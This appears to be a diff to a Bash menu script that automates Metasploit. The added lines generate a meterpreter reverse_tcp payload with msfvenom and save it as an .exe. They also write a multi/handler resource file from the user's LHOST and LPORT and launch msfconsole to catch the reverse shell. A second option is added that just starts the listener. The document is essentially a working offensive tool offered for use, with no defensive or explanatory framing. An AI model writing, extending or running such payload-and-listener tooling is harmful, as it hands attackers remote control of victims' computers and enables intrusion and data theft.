@@ -74,6 +74,11 @@ echo "E) Exit"
 read -p "-->> " player1
 ##################################################################################################################################
 if [[ $player1 == "1" ]]; then
+echo "starting..."
+rm -r listener.rc
+> listener.rc
+sleep 3
+
 clear
 echo "Make a Payload:"
 echo "More coming soon..."
@@ -87,20 +92,71 @@ echo ""
 echo "android) Android"
 echo ""
 read -p "-->> " payloadtype
+echo "use exploit/multi/handler" >> listener.rc
+echo "set PAYLOAD $payloadtype/meterpreter/reverse_tcp" >> listener.rc
 echo ""
 read -p "LHOST -->>" LHOST
+echo "set LHOST $LHOST" >> listener.rc
 echo ""
 read -p "LPORT -->>" LPORT
+echo "set LPORT $LPORT" >> listener.rc
 echo ""
 read -p "Payload Name -->>" PNAME
 EXE=.exe
 PNAMEEXE="$PNAME$EXE"
 echo ""
 echo "creating now.."
+echo "exploit" >> listener.rc
 msfvenom -p $payloadtype/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o /root/$PNAMEEXE
 echo "saved to /root/$PNAMEEXE"
+
+echo "Do you want to start a listener?"
+echo "y / n"
+read -p "-->>" listeneryesno
+  if [[ $listeneryesno == "y" ]]; then
+    msfconsole -r listener.rc
+  fi
+  if [[ $listeneryesno == "n" ]]; then
+    echo "ok"
+    rm -r listener.rc
+    >  listener.rc
+  fi
 sleep 5
 
 fi
 ##################################################################################################################################
+if [[ $player1 == "2" ]]; then
+echo "starting..."
+rm -r listener.rc
+> listener.rc
+sleep 3
+
+clear
+echo "meterpreter/reverse_tcp only"
+read -p "Press enter to continue"
+
+echo "use exploit/multi/handler" >> listener.rc
+
+echo "What payload type"
+read -p "-->>" payloadtype
+echo "set PAYLOAD $payloadtype/meterpreter/reverse_tcp" >> listener.rc
+
+echo "What is your LHOST"
+read -p "-->>" LHOST
+echo "set LHOST $LHOST" >> listener.rc
+
+echo "What is your LPORT"
+read -p "-->>" LPORT
+echo "set LPORT $LPORT" >> listener.rc
+echo "exploit" >> listener.rc
+
+read -p "Press enter to start"
+msfconsole -r listener.rc
+
+fi
+if [[ $player1 == "e" ]]; then
+cd ..
+exit 0
+fi
+
 done
